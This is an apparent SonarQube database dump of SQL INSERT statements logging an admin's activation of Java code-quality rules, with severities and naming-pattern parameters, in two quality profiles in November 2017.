INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2018, '2017-11-20 11:09:31.412', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm-UbbGRdfPp-q9F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2019, '2017-11-20 11:09:31.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm-4bbGRdfPp-q9G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2020, '2017-11-20 11:09:31.481', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm_ZbbGRdfPp-q9H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2021, '2017-11-20 11:09:31.507', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHm_zbbGRdfPp-q9I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2022, '2017-11-20 11:09:31.529', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnAJbbGRdfPp-q9J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2023, '2017-11-20 11:09:31.552', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnAgbbGRdfPp-q9K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2024, '2017-11-20 11:09:31.568', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnAwbbGRdfPp-q9L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2025, '2017-11-20 11:09:31.591', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnBHbbGRdfPp-q9M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2026, '2017-11-20 11:09:31.616', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnBgbbGRdfPp-q9N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2027, '2017-11-20 11:09:31.64', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnB4bbGRdfPp-q9O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2028, '2017-11-20 11:09:31.656', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnCIbbGRdfPp-q9P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2029, '2017-11-20 11:09:31.7', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnC0bbGRdfPp-q9Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2030, '2017-11-20 11:09:31.725', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnDNbbGRdfPp-q9R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2031, '2017-11-20 11:09:31.76', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnDwbbGRdfPp-q9S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2032, '2017-11-20 11:09:31.784', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnEIbbGRdfPp-q9T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2033, '2017-11-20 11:09:31.832', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnE4bbGRdfPp-q9U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2034, '2017-11-20 11:09:31.879', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnFnbbGRdfPp-q9V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2035, '2017-11-20 11:09:31.907', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnGDbbGRdfPp-q9W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2036, '2017-11-20 11:09:31.957', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnG1bbGRdfPp-q9X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2037, '2017-11-20 11:09:32.031', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnH_bbGRdfPp-q9Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2038, '2017-11-20 11:09:32.074', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnIqbbGRdfPp-q9Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2039, '2017-11-20 11:09:32.135', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnJnbbGRdfPp-q9a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2040, '2017-11-20 11:09:32.17', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnKKbbGRdfPp-q9b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2041, '2017-11-20 11:09:32.207', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnKvbbGRdfPp-q9c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2042, '2017-11-20 11:09:32.246', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnLWbbGRdfPp-q9d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2043, '2017-11-20 11:09:32.282', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnL6bbGRdfPp-q9e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2044, '2017-11-20 11:09:32.306', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnMSbbGRdfPp-q9f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2045, '2017-11-20 11:09:32.33', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnMqbbGRdfPp-q9g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2046, '2017-11-20 11:09:32.386', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnNibbGRdfPp-q9h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2047, '2017-11-20 11:09:32.411', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnN7bbGRdfPp-q9i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2048, '2017-11-20 11:09:32.429', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnONbbGRdfPp-q9j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2049, '2017-11-20 11:09:32.457', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnOpbbGRdfPp-q9k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2050, '2017-11-20 11:09:32.48', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnPAbbGRdfPp-q9l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2051, '2017-11-20 11:09:32.511', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnPfbbGRdfPp-q9m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2052, '2017-11-20 11:09:32.537', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnP5bbGRdfPp-q9n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2053, '2017-11-20 11:09:32.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_17-29529;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZHnQJbbGRdfPp-q9o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2054, '2017-11-20 11:14:37.402', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxrabbGRdfPp-q9q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2055, '2017-11-20 11:14:37.491', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxszbbGRdfPp-q9r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2056, '2017-11-20 11:14:37.524', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxtUbbGRdfPp-q9s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2057, '2017-11-20 11:14:37.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxtxbbGRdfPp-q9t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2058, '2017-11-20 11:14:37.587', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxuTbbGRdfPp-q9u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2059, '2017-11-20 11:14:37.619', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxuzbbGRdfPp-q9v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2060, '2017-11-20 11:14:37.643', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxvLbbGRdfPp-q9w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2061, '2017-11-20 11:14:37.675', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxvrbbGRdfPp-q9x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2062, '2017-11-20 11:14:37.704', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxwIbbGRdfPp-q9y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2063, '2017-11-20 11:14:37.735', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxwnbbGRdfPp-q9z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2064, '2017-11-20 11:14:37.774', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxxObbGRdfPp-q90');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2065, '2017-11-20 11:14:37.81', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxxybbGRdfPp-q91');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2066, '2017-11-20 11:14:37.839', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxyPbbGRdfPp-q92');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2067, '2017-11-20 11:14:37.867', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxyrbbGRdfPp-q93');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2068, '2017-11-20 11:14:37.91', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxzVbbGRdfPp-q94');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2069, '2017-11-20 11:14:37.929', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxzpbbGRdfPp-q95');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2070, '2017-11-20 11:14:37.95', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIxz-bbGRdfPp-q96');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2071, '2017-11-20 11:14:37.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx0YbbGRdfPp-q97');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2072, '2017-11-20 11:14:38.023', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx1HbbGRdfPp-q98');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2073, '2017-11-20 11:14:38.073', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx15bbGRdfPp-q99');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2074, '2017-11-20 11:14:38.148', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx3EbbGRdfPp-q9-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2075, '2017-11-20 11:14:38.184', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx3obbGRdfPp-q9_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2076, '2017-11-20 11:14:38.22', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx4MbbGRdfPp-q-A');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2077, '2017-11-20 11:14:38.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx5MbbGRdfPp-q-B');
